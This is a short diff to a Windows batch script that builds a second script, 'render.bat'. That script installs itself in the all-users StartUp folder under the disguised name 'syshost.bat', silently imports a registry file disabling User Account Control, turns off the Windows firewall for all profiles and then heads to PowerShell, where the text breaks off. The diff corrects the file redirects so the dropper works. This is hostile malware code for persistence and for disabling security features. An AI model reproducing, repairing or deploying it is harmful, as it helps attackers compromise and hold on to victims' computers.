@@ -3,8 +3,8 @@ echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Syst
 echo "EnableLUA"=dword:00000000>>%Temp%\lua.reg
 
 
-echo copy "%Temp%\render.bat" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\syshost.bat">>%Temp%\render.bat
-echo regedit /s lua.reg>%Temp%\render.bat
+echo copy "%Temp%\render.bat" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\syshost.bat">%Temp%\render.bat
+echo regedit /s lua.reg>>%Temp%\render.bat
 echo netsh advfirewall set allprofiles state off>>%Temp%\render.bat
 
 echo cd "C:\Windows\System32\WindowsPowerShell\v1.0">>%Temp%\render.bat
